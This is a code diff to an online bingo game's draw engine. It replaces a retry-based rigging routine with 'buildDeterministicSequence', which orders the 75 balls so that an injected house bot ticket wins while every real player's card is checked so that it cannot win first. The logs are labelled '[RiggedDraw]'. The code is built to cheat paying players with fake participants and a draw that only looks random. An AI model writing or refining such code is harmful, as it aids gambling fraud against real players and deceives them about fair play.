@@ -279,99 +279,170 @@ export function botsAlreadyInjected(gameId: string): boolean {
  * Returns a pre-determined number pool (ordered, drawn from end with .pop()).
  * The game draw loop simply plays back this sequence.
  */
-export function rigDrawSequence(
+function getWinPatterns(cardRows: any[][], targetWinMode: string): number[][] {
+  const patterns: number[][] = [];
+  
+  const extractNumbers = (coords: [number, number][]) => {
+    const nums: number[] = [];
+    for (const [r, c] of coords) {
+      const val = cardRows[r][c];
+      if (val !== 'FREE' && val !== 0 && val !== null) {
+        nums.push(Number(val));
+      }
+    }
+    return nums;
+  };
+
+  if (targetWinMode === 'ROW') {
+    for (let r = 0; r < 5; r++) {
+      patterns.push(extractNumbers([[r, 0], [r, 1], [r, 2], [r, 3], [r, 4]]));
+    }
+  } else if (targetWinMode === 'COLUMN') {
+    for (let c = 0; c < 5; c++) {
+      patterns.push(extractNumbers([[0, c], [1, c], [2, c], [3, c], [4, c]]));
+    }
+  } else if (targetWinMode === 'DIAGONAL') {
+    patterns.push(extractNumbers([[0, 0], [1, 1], [2, 2], [3, 3], [4, 4]]));
+    patterns.push(extractNumbers([[0, 4], [1, 3], [2, 2], [3, 1], [4, 0]]));
+  } else if (targetWinMode === 'FOUR_CORNERS') {
+    patterns.push(extractNumbers([[0, 0], [0, 4], [4, 0], [4, 4]]));
+  } else if (targetWinMode === 'FULL_HOUSE') {
+    const coords: [number, number][] = [];
+    for (let r = 0; r < 5; r++) {
+      for (let c = 0; c < 5; c++) coords.push([r, c]);
+    }
+    patterns.push(extractNumbers(coords));
+  }
+
+  return patterns;
+}
+
+function shuffleArray(arr: any[]) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+}
+
+function generateRandomSequence(): number[] {
+  const pool = Array.from({ length: 75 }, (_, i) => i + 1);
+  shuffleArray(pool);
+  return pool.reverse(); // Engine pops from the end
+}
+
+export function buildDeterministicSequence(
   tickets: { userId: string; card: any; isBot?: boolean }[],
   houseShouldWin: boolean,
-  maxAttempts = 2000,
   minDrawn = 20,
-  targetWinMode: string = 'ROW'  // target pattern for the bot to win with
+  targetWinMode: string = 'ROW'
 ): number[] {
-  const botUserIds = tickets
-    .filter(t => t.isBot)
-    .map(t => t.userId);
-  const botUserSet = new Set(botUserIds);
+  if (!houseShouldWin) {
+    logger.info(`[RiggedDraw] Player win requested. Using random sequence.`);
+    return generateRandomSequence();
+  }
 
-  for (let attempt = 0; attempt < maxAttempts; attempt++) {
-    // Build a fresh shuffled pool of 1–75
-    const pool = Array.from({ length: 75 }, (_, i) => i + 1);
-    for (let i = pool.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [pool[i], pool[j]] = [pool[j], pool[i]];
-    }
+  const botTickets = tickets.filter(t => t.isBot);
+  const realPlayerCards = tickets
+    .filter(t => !t.isBot)
+    .map(t => parseCardRows(t.card))
+    .filter(rows => rows !== null) as any[][][];
 
-    let firstWinnerIsBot: boolean | null = null;
-    let winAtBall = 0;
+  shuffleArray(botTickets);
 
-    for (let drawn = 1; drawn <= pool.length; drawn++) {
-      const drawnSoFar = pool.slice(0, drawn);
+  const allModes = [targetWinMode, 'ROW', 'COLUMN', 'DIAGONAL', 'FOUR_CORNERS'];
+  const triedModes = new Set<string>();
 
-      const winnersAtThisBall = [];
-      for (const ticket of tickets) {
-        const rows = parseCardRows(ticket.card);
-        if (!rows) continue;
+  for (const mode of allModes) {
+    if (triedModes.has(mode)) continue;
+    triedModes.add(mode);
 
-        const result = checkWin(rows, drawnSoFar);
-        if (result.won) {
-          winnersAtThisBall.push(ticket);
-        }
-      }
+    for (const bot of botTickets) {
+      const botRows = parseCardRows(bot.card);
+      if (!botRows) continue;
 
-      if (winnersAtThisBall.length > 0) {
-        winAtBall = drawn;
-        const botWinners = winnersAtThisBall.filter(t => botUserSet.has(t.userId));
-        const playerWinners = winnersAtThisBall.filter(t => !botUserSet.has(t.userId));
-        const botWon = botWinners.length > 0;
-        const playerWon = playerWinners.length > 0;
+      const patterns = getWinPatterns(botRows, mode);
+      shuffleArray(patterns); 
 
-        if (botWon && !playerWon) {
-          if (houseShouldWin) {
-            const botWinsWithTarget = botWinners.some(t => {
-              const rows = parseCardRows(t.card);
-              if (!rows) return false;
-              const result = checkWin(rows, drawnSoFar);
-              return result.won && result.modes.includes(targetWinMode as any);
-            });
-            // If we are early in attempts, we can try to hold out for the target mode
-            if (!botWinsWithTarget && attempt < 1000) {
-              firstWinnerIsBot = null;
-              break;
+      for (const pattern of patterns) {
+        const triggerCandidates = [...pattern];
+        shuffleArray(triggerCandidates);
+
+        for (const trigger of triggerCandidates) {
+          const preWinNumbers = pattern.filter(n => n !== trigger);
+          
+          const currentDrawn = new Set<number>();
+          let impossible = false;
+          
+          for (const num of [...preWinNumbers, trigger]) {
+            if (currentDrawn.has(num)) continue;
+            currentDrawn.add(num);
+            let safe = true;
+            const drawnArray = Array.from(currentDrawn);
+            for (const rows of realPlayerCards) {
+              if (checkWin(rows as any, drawnArray).won) {
+                safe = false; break;
+              }
             }
-            // Otherwise (or if it matched), we just accept any bot win to prevent exhaustion
-            firstWinnerIsBot = true;
-          } else {
-            firstWinnerIsBot = true;
+            if (!safe) { impossible = true; break; }
           }
-        } else if (playerWon && !botWon) {
-          firstWinnerIsBot = false;
-        } else {
-          // TIE — reject to be safe
-          firstWinnerIsBot = houseShouldWin ? false : true;
+          if (impossible) continue; 
+
+          const fillersPool = Array.from({ length: 75 }, (_, i) => i + 1).filter(n => !pattern.includes(n));
+          shuffleArray(fillersPool);
+
+          const safeFillers: number[] = [];
+          
+          const isNumSafeForEveryone = (num: number, drawnSet: Set<number>) => {
+            if (drawnSet.has(num)) return true;
+            drawnSet.add(num);
+            let safe = true;
+            const drawnArray = Array.from(drawnSet);
+            
+            for (const rows of realPlayerCards) {
+              if (checkWin(rows as any, drawnArray).won) {
+                safe = false; break;
+              }
+            }
+            if (safe) {
+              if (checkWin(botRows as any, drawnArray).won) {
+                safe = false; 
+              }
+            }
+            
+            drawnSet.delete(num);
+            return safe;
+          };
+
+          for (const filler of fillersPool) {
+            if (isNumSafeForEveryone(filler, currentDrawn)) {
+              safeFillers.push(filler);
+              currentDrawn.add(filler);
+            }
+          }
+
+          const targetPreWinCount = Math.max(0, minDrawn - 1);
+          const neededFillers = Math.max(0, targetPreWinCount - preWinNumbers.length);
+          const selectedFillers = safeFillers.slice(0, neededFillers);
+          
+          const preTriggerSequence = [...preWinNumbers, ...selectedFillers];
+          shuffleArray(preTriggerSequence);
+          
+          const sequenceToWin = [...preTriggerSequence, trigger];
+          
+          const remainingBalls = Array.from({ length: 75 }, (_, i) => i + 1)
+            .filter(n => !sequenceToWin.includes(n));
+          shuffleArray(remainingBalls);
+          
+          const finalSequence = [...sequenceToWin, ...remainingBalls];
+          
+          logger.info(`[RiggedDraw] ✅ Built deterministic sequence for bot using mode ${mode}. Trigger: ${trigger}, total to win: ${sequenceToWin.length}`);
+          
+          return finalSequence.reverse();
         }
-        break;
       }
     }
-
-    // Reject any sequence where a win occurs before minDrawn balls
-    if (firstWinnerIsBot === null || winAtBall < minDrawn) continue;
-
-    // Check if this sequence matches what we want
-    if (houseShouldWin && firstWinnerIsBot === true) {
-      logger.info(`[RiggedDraw] Flawless House win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall} (No player ties)`);
-      return pool.reverse();
-    }
-    if (!houseShouldWin && firstWinnerIsBot === false) {
-      logger.info(`[RiggedDraw] Player win sequence found in ${attempt + 1} attempt(s) at ball #${winAtBall}`);
-      return pool.reverse();
-    }
-    // Wrong outcome or a tie — try another shuffle
   }
 
-  // Fallback: return a random sequence (exhausted attempts)
-  logger.warn(`[RiggedDraw] Exhausted ${maxAttempts} attempts — using random sequence`);
-  const fallback = Array.from({ length: 75 }, (_, i) => i + 1);
-  for (let i = fallback.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [fallback[i], fallback[j]] = [fallback[j], fallback[i]];
-  }
-  return fallback.reverse();
+  logger.warn(`[RiggedDraw] ❌ Failed to build deterministic sequence. Falling back to random.`);
+  return generateRandomSequence();
 }
